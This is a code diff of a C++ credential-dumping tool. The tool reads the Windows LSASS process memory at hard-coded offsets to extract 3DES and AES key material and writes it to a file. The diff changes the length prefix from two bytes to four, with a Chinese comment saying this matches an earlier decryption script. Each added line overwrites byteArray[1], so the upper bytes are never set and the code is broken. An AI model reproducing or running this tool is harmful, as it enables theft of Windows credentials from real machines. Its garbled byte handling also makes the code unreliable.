@@ -592,9 +592,13 @@ int main(int argc, char* argv[]) {
         }
 
         // Convert the WORD to a byte array
-        BYTE byteArray[2];
+        BYTE byteArray[4];
+
+        // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
         byteArray[0] = (BYTE)(_cipher_length & 0xFF);         // Low byte
         byteArray[1] = (BYTE)((_cipher_length >> 8) & 0xFF);  // High byte
+        byteArray[1] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte
+        byteArray[1] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 
 
         // Write the byte array to the file
         DWORD bytesWritten;
@@ -658,9 +662,12 @@ int main(int argc, char* argv[]) {
     SecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + 0x38 + 4)), (void*)stack_string, _3des_len, &bytesRead);
 
-    BYTE byteArray[2];
+    BYTE byteArray[4];
+    // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
     byteArray[0] = (BYTE)(_3des_len & 0xFF);         // Low byte
     byteArray[1] = (BYTE)((_3des_len >> 8) & 0xFF);  // High byte
+    byteArray[1] = (BYTE)((_3des_len >> 16) & 0xFF);  // High byte
+    byteArray[1] = (BYTE)((_3des_len >> 24) & 0xFF);  // High byte 
 
     // Write the byte array to the file
     DWORD bytesWritten;
@@ -724,8 +731,11 @@ int main(int argc, char* argv[]) {
 
     SecureZeroMemory(stack_string, 50);
     NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + 0x38 + 4)), (void*)stack_string, _aes_len, &bytesRead);
+    // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
     byteArray[0] = (BYTE)(_aes_len & 0xFF);         // Low byte
     byteArray[1] = (BYTE)((_aes_len >> 8) & 0xFF);  // High byte
+    byteArray[1] = (BYTE)((_aes_len >> 16) & 0xFF);  // High byte
+    byteArray[1] = (BYTE)((_aes_len >> 24) & 0xFF);  // High byte
 
     // Write the byte array to the file
     if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
